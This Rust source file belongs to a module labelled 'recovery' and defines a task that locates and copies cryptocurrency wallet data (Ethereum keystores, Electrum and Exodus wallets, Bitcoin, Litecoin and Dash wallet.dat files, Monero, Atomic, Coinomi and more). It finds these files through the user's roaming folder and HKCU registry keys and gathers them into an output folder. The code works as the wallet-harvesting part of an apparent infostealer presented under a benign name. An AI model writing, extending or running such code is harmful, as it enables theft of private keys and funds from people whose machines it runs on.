use crate::recovery::{
    context::RecoveryContext,
    fs::{copy_dir_limited, sanitize_label},
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use winreg::RegKey;
use winreg::enums::HKEY_CURRENT_USER;

pub fn wallet_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(CryptoWalletTask::new(ctx))]
}

struct CryptoWalletTask {
    specs: Vec<WalletSpec>,
}

impl CryptoWalletTask {
    fn new(ctx: &RecoveryContext) -> Self {
        Self {
            specs: build_wallet_specs(ctx),
        }
    }
}

#[async_trait]
impl RecoveryTask for CryptoWalletTask {
    fn label(&self) -> String {
        "Crypto Wallet Data".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        for spec in &self.specs {
            let dest_root = wallet_output_dir(ctx, spec.label).await?;
            for dir in &spec.directories {
                copy_wallet_directory(&spec.label, dir, &dest_root, &mut artifacts).await?;
            }
            for file in &spec.files {
                copy_wallet_file(&spec.label, file, &dest_root, &mut artifacts).await?;
            }
        }

        Ok(artifacts)
    }
}

struct WalletSpec {
    label: &'static str,
    directories: Vec<PathBuf>,
    files: Vec<PathBuf>,
}

impl WalletSpec {
    fn new(label: &'static str) -> Self {
        Self {
            label,
            directories: Vec::new(),
            files: Vec::new(),
        }
    }

    fn dir(mut self, path: PathBuf) -> Self {
        self.directories.push(path);
        self
    }

    fn file(mut self, path: PathBuf) -> Self {
        self.files.push(path);
        self
    }
}

fn build_wallet_specs(ctx: &RecoveryContext) -> Vec<WalletSpec> {
    let roaming = &ctx.roaming_data_dir;
    let mut specs = Vec::new();

    specs.push(WalletSpec::new("Ethereum Keystore").dir(roaming.join("Ethereum").join("keystore")));
    specs.push(WalletSpec::new("Electrum Wallets").dir(roaming.join("Electrum").join("wallets")));

    if let Some(dir) = registry_dir("Software\\Dash\\Dash-Qt", "strDataDir") {
        specs.push(WalletSpec::new("Dash Data").file(dir.join("wallet.dat")));
    }

    specs.push(WalletSpec::new("Bytecoin").dir(roaming.join("bytecoin")));
    if let Some(dir) = registry_dir("Software\\Bitcoin\\Bitcoin-Qt", "strDataDir") {
        specs.push(WalletSpec::new("Bitcoin Core").file(dir.join("wallet.dat")));
    }

    specs.push(
        WalletSpec::new("Atomic LevelDB")
            .dir(roaming.join("atomic").join("Local Storage").join("leveldb")),
    );
    specs.push(WalletSpec::new("Armory").dir(roaming.join("Armory")));
    specs.push(WalletSpec::new("Exodus").file(roaming.join("Exodus").join("exodus.wallet")));
    specs.push(
        WalletSpec::new("Jaxx LevelDB").dir(
            roaming
                .join("com.liberty.jaxx")
                .join("IndexedDB")
                .join("file__0.indexeddb.leveldb"),
        ),
    );

    if let Some(dir) = registry_dir("Software\\Litecoin\\Litecoin-Qt", "strDataDir") {
        specs.push(WalletSpec::new("Litecoin Core").file(dir.join("wallet.dat")));
    }

    if let Some(path) = registry_value("Software\\monero-project\\monero-core", "wallet_path") {
        let normalized = PathBuf::from(path.replace('/', "\\"));
        specs.push(WalletSpec::new("Monero Core").file(normalized));
    }

    specs.push(WalletSpec::new("Zcash").dir(roaming.join("Zcash")));
    specs.push(
        WalletSpec::new("Coinomi").dir(roaming.join("Coinomi").join("Coinomi").join("wallets")),
    );
    specs.push(
        WalletSpec::new("Guarda LevelDB")
            .dir(roaming.join("Guarda").join("Local Storage").join("leveldb")),
    );
    specs.push(WalletSpec::new("Zephyr").dir(roaming.join("Zephyr").join("wallets")));

    specs
}

fn registry_dir(subkey: &str, value: &str) -> Option<PathBuf> {
    RegKey::predef(HKEY_CURRENT_USER)
        .open_subkey(subkey)
        .ok()
        .and_then(|key| key.get_value::<String, _>(value).ok())
        .map(PathBuf::from)
}

fn registry_value(subkey: &str, value: &str) -> Option<String> {
    RegKey::predef(HKEY_CURRENT_USER)
        .open_subkey(subkey)
        .ok()
        .and_then(|key| key.get_value::<String, _>(value).ok())
}

async fn wallet_output_dir(ctx: &RecoveryContext, label: &str) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("Wallets")
        .join(sanitize_label(label));
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}

async fn copy_wallet_directory(
    label: &str,
    src: &Path,
    dst: &Path,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    match fs::metadata(src).await {
        Ok(metadata) if metadata.is_dir() => {
            copy_dir_limited(src, dst, label, artifacts, usize::MAX, 0).await?;
        }
        _ => {}
    }
    Ok(())
}

async fn copy_wallet_file(
    label: &str,
    file: &Path,
    dst_root: &Path,
    artifacts: &mut Vec<RecoveryArtifact>,
) -> Result<(), RecoveryError> {
    if !file.exists() {
        return Ok(());
    }

    fs::create_dir_all(dst_root).await?;
    let dest = dst_root.join(
        file.file_name()
            .unwrap_or_else(|| std::ffi::OsStr::new("file")),
    );
    fs::copy(file, &dest).await?;
    let meta = fs::metadata(&dest).await?;
    artifacts.push(RecoveryArtifact {
        label: label.to_string(),
        path: dest,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    });
    Ok(())
}
